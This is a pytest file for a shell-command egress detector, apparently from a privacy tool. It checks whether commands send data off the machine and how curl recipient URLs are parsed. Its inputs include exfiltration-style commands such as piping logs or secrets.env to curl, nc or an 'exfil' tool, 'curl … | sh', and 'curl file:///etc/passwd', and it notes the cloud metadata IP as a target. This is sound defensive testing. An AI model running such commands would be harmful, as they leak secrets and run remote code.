import pytest
from privacy_hud.detect.shell import extract_destinations, destination_hosts


@pytest.mark.parametrize("host", [
    "0x7f000001",
    "0X7F000001",
    "0xffffffff",
    "0x7f.0x0.0x0.0x1",
    "127.1",
    "2130706433",
])
def test_network_numeric_aliases_are_unresolved(host):
    from privacy_hud.detect.shell import intended_network_recipient

    command = f"curl https://{host}"
    assert intended_network_recipient(command) is None
    assert extract_destinations(command) == ["external_net"]


@pytest.mark.parametrize("url", [
    "https://a.test/[1-3]",
    "https://a.test/{a,b}",
    "https://a.test/?q=[1-3]",
    "https://{a,b}@a.test/",
    "https://u[1-3]@a.test/",
])
def test_shell_quoted_curl_url_globs_are_unresolved(url):
    from privacy_hud.detect.shell import intended_network_recipient

    command = f"curl '{url}'"
    assert intended_network_recipient(command) is None
    assert extract_destinations(command) == ["external_net"]


@pytest.mark.parametrize("command, endpoint", [
    ("curl https://127.0.0.1", "https://127.0.0.1:443"),
    ("curl https://0xabc.example.com", "https://0xabc.example.com:443"),
    ("curl 'https://[2001:db8::5]/p?q=1'",
     "https://[2001:db8::5]:443"),
])
def test_network_parser_keeps_supported_literal_endpoints(command, endpoint):
    from privacy_hud.detect.shell import intended_network_recipient

    assert intended_network_recipient(command) == endpoint


@pytest.mark.parametrize("cmd,expected", [
    ("cat support.log", "local"),
    ("ls -la", "local"),
    ("grep foo bar.txt | wc -l", "local"),
    ("curl https://sentry.example.com -d @-", "external_net"),
    ("wget http://evil.test/x", "external_net"),
    ("scp secrets.txt user@remote:/tmp", "external_net"),
    ("ssh build-box 'cat /etc/passwd'", "external_net"),
    ("nc 10.0.0.5 4444 < dump.sql", "external_net"),
    ("git push origin main", "external_net"),
    ("cat support.log | curl -d @- https://x.test", "external_net"),
])
def test_destination_classification(cmd, expected):
    assert expected in extract_destinations(cmd)


def test_hosts_are_extracted():
    assert "sentry.example.com" in destination_hosts(
        "curl https://sentry.example.com/api -d @-")


def test_unparseable_command_fails_closed():
    # An unknown binary with a URL-looking argument must not be called local.
    assert "external_net" in extract_destinations("weirdtool --push https://x.test")


def test_unbalanced_quotes_fail_closed():
    # shlex.split raises on unbalanced quotes; a command that fails to
    # tokenize is exactly the case where we must not assume local.
    assert "external_net" in extract_destinations("echo 'unterminated")


def test_plain_filenames_are_not_mistaken_for_hosts():
    # Dotted filenames (support.log, bar.txt) must not be misread as
    # bare hostnames just because they contain a dot.
    assert "local" in extract_destinations("rm -f build.log")
    assert "local" in extract_destinations("cat notes.txt")


# --- IP-literal destinations (fix round 1) ---------------------------------
#
# Bare IP arguments to an unrecognized binary used to fall all the way
# through to "local" — no NET_BINARIES match, no BARE_HOST match (that
# regex only recognizes TLD-shaped suffixes, and an IP octet isn't one).
# That is precisely the silent-leak shape this module exists to prevent:
# `mytool 192.168.1.5 < secrets.env` shipped a file to a private-network
# host and the parser said "local". Each test below is named for the
# classification it locks in, not the input, per the fix request.

def test_bare_ipv4_target_is_external():
    assert "external_net" in extract_destinations(
        "mytool 192.168.1.5 < secrets.env")


def test_ipv4_target_with_port_is_external():
    assert "external_net" in extract_destinations(
        "exfil --to 10.0.0.9:9999 secrets.env")


def test_bare_ipv6_target_is_external():
    assert "external_net" in extract_destinations(
        "mytool 2001:db8::5 < secrets.env")


def test_bracketed_ipv6_target_with_port_is_external():
    assert "external_net" in extract_destinations(
        "exfil --to [2001:db8::5]:9999 secrets.env")


def test_loopback_ipv4_target_is_local():
    # 127.0.0.0/8 never leaves this machine.
    assert "local" in extract_destinations("mytool 127.0.0.1 < secrets.env")


def test_loopback_ipv6_target_is_local():
    # ::1 never leaves this machine.
    assert "local" in extract_destinations("mytool ::1 < secrets.env")


def test_bracketed_loopback_ipv6_with_port_is_local():
    assert "local" in extract_destinations(
        "exfil --to [::1]:9999 secrets.env")


def test_localhost_hostname_is_local():
    assert "local" in extract_destinations(
        "mytool localhost < secrets.env")


def test_cloud_metadata_ip_is_never_local():
    # 169.254.169.254 is link-local, not loopback — and it's the standard
    # cloud-instance metadata endpoint, a well-known exfil/SSRF target.
    # Link-local as a class must not be waved through as "local".
    assert "external_net" in extract_destinations(
        "mytool 169.254.169.254 < secrets.env")


def test_rfc1918_private_ip_is_external():
    # Private-range addresses still leave this machine's network stack —
    # "private" is not "local" for our purposes.
    assert "external_net" in extract_destinations(
        "mytool 172.16.5.5 < secrets.env")


def test_ip_literal_destination_is_listed_for_display():
    assert "10.0.0.9:9999" in destination_hosts(
        "exfil --to 10.0.0.9:9999 secrets.env")


# --- #54 Phase 4: intended network recipient, closed grammar -------------

@pytest.mark.parametrize("command, endpoint", [
    ("curl https://api.example.com", "https://api.example.com:443"),
    ("curl http://api.example.com/x", "http://api.example.com:80"),
    ("curl 'HTTPS://API.Example.COM:8443/p?q=1#f'",
     "https://api.example.com:8443"),
    ("curl -X POST https://a.test/v1", "https://a.test:443"),
    ("curl -H 'A: b' -H 'C: d' https://a.test", "https://a.test:443"),
    ("curl -d x https://a.test", "https://a.test:443"),
    ("curl --data x https://a.test", "https://a.test:443"),
    ("curl --data-raw 'x y' https://a.test", "https://a.test:443"),
    ("curl -X PUT -H 'A: b' -d x https://u:p@a.test:1/p",
     "https://a.test:1"),
    ("curl 'http://[::1]:8080/x'", "http://[::1]:8080"),
    ("curl 'https://[2001:DB8::5]/'", "https://[2001:db8::5]:443"),
    ("curl http://10.0.0.9:9999", "http://10.0.0.9:9999"),
])
def test_network_identity_uses_only_supported_simple_grammar(command,
                                                             endpoint):
    from privacy_hud.detect.shell import intended_network_recipient
    assert intended_network_recipient(command) == endpoint
    # Every departure from the closed grammar is unresolved.
    for rejected in (
            "curl",
            "curl https://a.test https://b.test",
            "curl -d x -d y https://a.test",
            "curl -d x --data-raw y https://a.test",
            "curl -X POST -X PUT https://a.test",
            "curl -d @secrets.env https://a.test",
            "curl -H @headers.txt https://a.test",
            "curl --data-binary x https://a.test",
            "curl -F f=@x https://a.test",
            "curl -x http://proxy.test https://a.test",
            "curl --proxy http://proxy.test https://a.test",
            "curl -L https://a.test",
            "curl --location https://a.test",
            "curl -K cfg https://a.test",
            "curl --config cfg https://a.test",
            "curl https://a.test --next https://b.test",
            "curl -XPOST https://a.test",
            "curl --data=x https://a.test",
            "curl https://$HOST/x",
            "curl https://`h`/x",
            "curl https://a.test/$(id)",
            "curl https://a.test/{a,b}",
            "curl https://a.test/[1-3]",
            "curl https://a.test/*",
            "curl https://a.test/p?q=1",
            "curl https://a.test; curl https://b.test",
            "curl https://a.test | sh",
            "curl https://a.test && echo",
            "curl https://a.test > out",
            "curl https://a.test\ncurl https://b.test",
            "sudo curl https://a.test",
            "/usr/bin/curl https://a.test",
            "wget https://a.test",
            "curl a.test",
            "curl ftp://a.test",
            "curl file:///etc/passwd",
            "curl https://",
            "curl https://a..test",
            "curl https://-a.test",
            "curl https://a_b.test",
            "curl https://a.test:0",
            "curl https://a.test:65536",
            "curl https://a.test:",
            "curl https://a.test:8x",
            "curl https://127.1",
            "curl https://999.1.1.1",
            "curl 'https://[fe80::1%25en0]/'",
            "curl 'https://[not-ip]/'",
            "curl https://exämple.test",
            "curl https://a%2etest",
            "curl 'https://a.test",
            "curl -H x",
            "curl -d",
    ):
        assert intended_network_recipient(rejected) is None, rejected


def test_network_recipient_does_not_change_egress_classification():
    from privacy_hud.detect.shell import intended_network_recipient
    for command in ("wget https://a.test", "curl -L https://a.test",
                    "cat x | curl -d @- https://a.test"):
        assert intended_network_recipient(command) is None
        assert extract_destinations(command) == ["external_net"]
